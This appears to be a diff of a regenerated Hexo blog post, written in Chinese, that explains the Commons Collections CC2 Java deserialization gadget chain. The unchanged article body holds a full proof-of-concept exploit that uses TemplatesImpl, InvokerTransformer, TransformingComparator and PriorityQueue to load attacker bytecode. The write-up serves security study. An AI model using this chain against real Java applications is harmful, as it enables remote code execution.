@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.2">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -28,8 +28,8 @@
 <meta property="og:description" content="环境 和cc4相同 CC2 这条链实际上是在 CC4 链基础上的修改，目的是为了避免使用 Transformer 数组。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sunian19.github.io/imgss/java167.png">
-<meta property="article:published_time" content="2022-11-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-06T15:20:06.835Z">
+<meta property="article:published_time" content="2022-11-06T07:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-18T16:56:04.123Z">
 <meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="java安全系列">
 <meta property="article:tag" content="反序列化">
@@ -152,7 +152,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#huan-jing"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-de-bian-xie"><span class="nav-number">2.</span> <span class="nav-text">exp的编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xiao-jie"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-number">2.</span> <span class="nav-text">exp的编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -167,7 +167,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -178,7 +178,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -269,10 +269,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-11-06 00:00:00 / 修改时间：23:20:06" itemprop="dateCreated datePublished" datetime="2022-11-06T00:00:00+08:00">2022-11-06</time>
+      <time title="创建时间：2022-11-06 00:00:00" itemprop="dateCreated datePublished" datetime="2022-11-06T00:00:00-07:00">2022-11-06</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2024-01-18 08:56:04" itemprop="dateModified" datetime="2024-01-18T08:56:04-08:00">2024-01-18</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -301,11 +307,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h3 id="huan-jing" id="环境">环境</h3>
+        <h3 id="环境">环境</h3>
 <p>和cc4相同</p>
 <p>CC2 这条链实际上是在 CC4 链基础上的修改，目的是为了避免使用 Transformer 数组。</p>
-<a id="more"></a>
-<h3 id="exp-de-bian-xie" id="exp的编写">exp的编写</h3>
+<span id="more"></span>
+<h3 id="exp的编写">exp的编写</h3>
 <p>那么我们就需要找能够调用newTransformer的方法。<br>
 所以后面的链子依旧是cc3的后半部分</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line"><span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
@@ -313,7 +319,7 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer&lt;Object, Object&gt; InvokernewTransformer = <span class="keyword">new</span> InvokerTransformer&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(InvokernewTransformer);</span><br><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></div>
 <p>最终exp</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC2Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;zer0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField = aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\code\\CCTest\\src\\main\\java\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; InvokernewTransformer = <span class="keyword">new</span> InvokerTransformer&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator&lt;&gt;(<span class="keyword">new</span> ConstantTransformer&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        Class c = transformingComparator.getClass();</span><br><span class="line">        Field transformerField = c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,InvokernewTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream out_obj1 = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./2.ser&quot;</span>));</span><br><span class="line">        out_obj1.writeObject(obj);</span><br><span class="line">        out_obj1.close();</span><br><span class="line"><span class="comment">//        System.out.println(obj);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  Object <span class="title">unserialization</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream obj2 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object ois = obj2.readObject();</span><br><span class="line">        <span class="keyword">return</span> ois;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<h3 id="xiao-jie" id="小结">小结</h3>
+<h3 id="小结">小结</h3>
 <p>CC2 链区别与其他链子一点的区别在于没有用 Transformer 数组。不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。</p>
 <p>至此的流程图<br>
 <img src="/imgss/java167.png" alt=""></p>
@@ -362,7 +368,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
